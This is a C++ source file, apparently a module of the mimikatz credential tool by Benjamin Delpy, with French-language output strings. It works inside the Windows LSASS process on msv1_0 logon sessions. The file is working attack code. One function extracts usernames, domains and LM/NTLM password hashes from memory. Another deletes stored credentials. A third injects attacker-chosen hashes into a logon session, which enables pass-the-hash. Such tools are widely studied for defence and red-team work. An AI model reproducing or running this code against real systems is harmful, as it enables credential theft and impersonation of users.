/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence    : http://creativecommons.org/licenses/by/3.0/fr/
	Ce fichier : http://creativecommons.org/licenses/by/3.0/fr/
*/
#include "msv1_0.h"

bool searchMSVFuncs()
{
	if(!MSV1_0_MspAuthenticationPackageId)
			MSV1_0_MspAuthenticationPackageId = (mod_system::GLOB_Version.dwBuildNumber < 7000) ? 2 : 3;
	return (searchLSAFuncs() && (MSV1_0_MspAuthenticationPackageId != 0));
}

bool WINAPI getMSVLogonData(__in PLUID logId, __in mod_pipe * monPipe, __in bool justSecurity)
{
	wostringstream maReponse;
	if(searchMSVFuncs())
	{
		unsigned short reservedSize = 0;
		PMSV1_0_PRIMARY_CREDENTIAL kiwiCreds = NULL;
		if(NT_SUCCESS(NlpGetPrimaryCredential(logId, &kiwiCreds, &reservedSize)))
		{
			wstring lmHash = mod_text::stringOfHex(kiwiCreds->LmOwfPassword, sizeof(kiwiCreds->LmOwfPassword));
			wstring ntHash = mod_text::stringOfHex(kiwiCreds->NtOwfPassword, sizeof(kiwiCreds->NtOwfPassword));

			if(justSecurity)
				maReponse << L"lm{ " << lmHash << L" }, ntlm{ " << ntHash << L" }";
			else
			{
				maReponse << endl <<
					L"\t * Utilisateur  : " << mod_text::stringOfSTRING(kiwiCreds->UserName) << endl <<
					L"\t * Domaine      : " << mod_text::stringOfSTRING(kiwiCreds->LogonDomainName) << endl <<
					L"\t * Hash LM      : " << lmHash << endl <<
					L"\t * Hash NTLM    : " << ntHash;
			}
			SeckPkgFunctionTable->FreeLsaHeap(kiwiCreds);
		}
		else maReponse << L"n.t. (LUID KO)";
	}
	else maReponse << L"n.a. (msv KO)";

	return sendTo(monPipe, maReponse.str());
}

__kextdll bool __cdecl getLogonSessions(mod_pipe * monPipe, vector<wstring> * mesArguments)
{
	vector<pair<PFN_ENUM_BY_LUID, wstring>> monProvider;
	monProvider.push_back(make_pair<PFN_ENUM_BY_LUID, wstring>(getMSVLogonData, wstring(L"msv1_0")));
	return getLogonData(monPipe, mesArguments, &monProvider);
}

__kextdll bool __cdecl delLogonSession(mod_pipe * monPipe, vector<wstring> * mesArguments)
{
	wostringstream maReponse;
	if(searchMSVFuncs())
	{
		if(!mesArguments->empty() && mesArguments->size() >= 1 && mesArguments->size() <= 2)
		{
			wstring idSecAppHigh = L"0";
			wstring idSecAppLow = mesArguments->front();
			if(mesArguments->size() > 1)
			{
				idSecAppHigh = mesArguments->front(); idSecAppLow = mesArguments->back();
			}

			LUID idApp = mod_text::wstringsToLUID(idSecAppHigh, idSecAppLow);
			if(idApp.LowPart != 0 || idApp.HighPart != 0)
				maReponse << (NT_SUCCESS(NlpDeletePrimaryCredential(&idApp)) ? L"Suppression des données de sécurité réussie :)" : L"Suppression des données de sécurité en échec :(");
			else maReponse << L"LUID incorrect !";
		}
		else maReponse << L"Format d\'appel invalide : delLogonSession [idSecAppHigh] idSecAppLow";
	}
	else maReponse << L"n.a. (msv KO)";

	maReponse << endl;
	return sendTo(monPipe, maReponse.str());
}

__kextdll bool __cdecl addLogonSession(mod_pipe * monPipe, vector<wstring> * mesArguments)
{
	wostringstream maReponse;
	if(searchMSVFuncs())
	{
		if(!mesArguments->empty() && mesArguments->size() >= 4 && mesArguments->size() <= 6)
		{
			MSV1_0_PRIMARY_CREDENTIAL kiwicreds;
			RtlZeroMemory(&kiwicreds, sizeof(MSV1_0_PRIMARY_CREDENTIAL));
			
			wstring idSecAppHigh = L"0", idSecAppLow, userName, domainName, lmHash, ntlmHash = mesArguments->back();
			kiwicreds.LmPasswordPresent = FALSE;
			kiwicreds.NtPasswordPresent = TRUE;

			switch(mesArguments->size()) // méchants arguments utilisateurs
			{
			case 4:
				idSecAppLow = mesArguments->front();
				userName = mesArguments->at(1);
				domainName = mesArguments->at(2);
				break;
			case 6:
				idSecAppHigh = mesArguments->front();
				idSecAppLow = mesArguments->at(1);
				userName = mesArguments->at(2);
				domainName = mesArguments->at(3);
				kiwicreds.LmPasswordPresent = TRUE;
				lmHash = mesArguments->at(4);
				break;
			case 5:
				if(mesArguments->at(3).size() == 0x20)
				{
					idSecAppLow = mesArguments->front();
					userName = mesArguments->at(1);
					domainName = mesArguments->at(2);
					kiwicreds.LmPasswordPresent = TRUE;
					lmHash = mesArguments->at(3);
				}
				else
				{
					idSecAppHigh = mesArguments->front();
					idSecAppLow = mesArguments->at(1);
					userName = mesArguments->at(2);
					domainName = mesArguments->at(3);
				}
				break;
			}

			LUID idApp = mod_text::wstringsToLUID(idSecAppHigh, idSecAppLow);

			if(idApp.LowPart != 0 || idApp.HighPart != 0)
			{
				if((!kiwicreds.LmPasswordPresent || (lmHash.size() == 0x20)) && ntlmHash.size() == 0x20 && userName.size() <= MAX_USERNAME_LEN && domainName.size() <= MAX_DOMAIN_LEN)
				{
					mod_text::InitLsaStringToBuffer(&kiwicreds.UserName, userName, kiwicreds.BuffUserName);
					mod_text::InitLsaStringToBuffer(&kiwicreds.LogonDomainName, domainName, kiwicreds.BuffDomaine);
					if(kiwicreds.LmPasswordPresent)
						mod_text::wstringHexToByte(lmHash, kiwicreds.LmOwfPassword);
					mod_text::wstringHexToByte(ntlmHash, kiwicreds.NtOwfPassword);

					maReponse << (NT_SUCCESS(NlpAddPrimaryCredential(&idApp, &kiwicreds, sizeof(kiwicreds))) ? L"Injection de données de sécurité réussie :)" : L"Injection de données de sécurité en échec :(");
				}
				else maReponse << L"Les hashs LM et NTLM doivent faire 32 caractères, le nom d\'utilisateur et le domaine/poste au maximum 22 caractères";
			}
			else maReponse << L"LUID incorrect !";
		}
		else maReponse << L"Format d\'appel invalide : addLogonSession [idSecAppHigh] idSecAppLow Utilisateur {Domaine|Poste} [HashLM] HashNTLM";
	}
	else maReponse << L"n.a. (msv KO)";

	maReponse << endl;
	return sendTo(monPipe, maReponse.str());
}
